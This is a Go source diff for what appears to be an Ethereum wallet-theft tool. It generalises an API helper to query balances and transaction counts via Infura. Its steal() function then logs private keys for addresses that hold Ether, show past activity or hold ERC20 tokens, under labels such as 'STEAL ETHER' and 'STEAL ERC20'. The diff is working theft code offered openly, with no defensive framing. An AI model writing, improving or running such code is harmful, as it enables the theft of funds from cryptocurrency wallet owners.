@@ -18,8 +18,8 @@ import (
 )
 
 const (
-	httpTimeout   = 10
 	urlForBalance = "https://api.infura.io/v1/jsonrpc/mainnet/eth_getBalance?params=[\"%s\",\"latest\"]"
+	urlForTxCount = "https://api.infura.io/v1/jsonrpc/mainnet/eth_getTransactionCount?params=[\"%s\",\"latest\"]"
 )
 
 var (
@@ -27,10 +27,11 @@ var (
 	who    string
 )
 
-func isBalanceGreaterThanZero(addr string) (b bool, val string) {
-	url := fmt.Sprintf(urlForBalance, addr)
+func get(baseURL, addr string) (b bool, val string) {
+	url := fmt.Sprintf(baseURL, addr)
 	ret, err := json.GetRPCResponseFromURL(url)
 	if err != nil {
+		fmt.Print("UNSTABLE NETWORK")
 		return
 	}
 
@@ -43,16 +44,24 @@ func isBalanceGreaterThanZero(addr string) (b bool, val string) {
 	return
 }
 
+func hasBalance(addr string) (b bool, val string) {
+	return get(urlForBalance, addr)
+}
+
+func hasTxCount(addr string) (b bool, val string) {
+	return get(urlForTxCount, addr)
+}
+
 func steal(addr common.Address, privkey []byte) {
-	canStealEther, _ := isBalanceGreaterThanZero(addr.String())
-	if canStealEther {
-		log.Infof("STEAL ETHER from %s !!SECRET!! %x", addr.String(), privkey)
+	addrStr := addr.String()
+	if canStealEther, _ := hasBalance(addrStr); canStealEther {
+		log.Infof("STEAL ETHER from %s !!SECRET!! %x", addrStr, privkey)
+	} else if canCandidate, _ := hasTxCount(addrStr); canCandidate {
+		log.Infof("GOT CANDIDATE %s !!SECRET!! %x", addrStr, privkey)
+	} else if canStealERC := contract.CanSteal(addr); canStealERC != "" {
+		log.Infof("STEAL ERC20 from %s !!SECRET!! %x TARGET %s", addrStr, privkey, canStealERC)
 	} else {
-		if canStealERC := contract.CanSteal(addr); canStealERC != "" {
-			log.Infof("STEAL ERC20 from %s !!SECRET!! %x TARGET %s", addr.String(), privkey, canStealERC)
-		} else {
-			fmt.Printf("FAILED from %s\n", addr.String())
-		}
+		fmt.Printf("FAILED from %s\n", addrStr)
 	}
 }
 
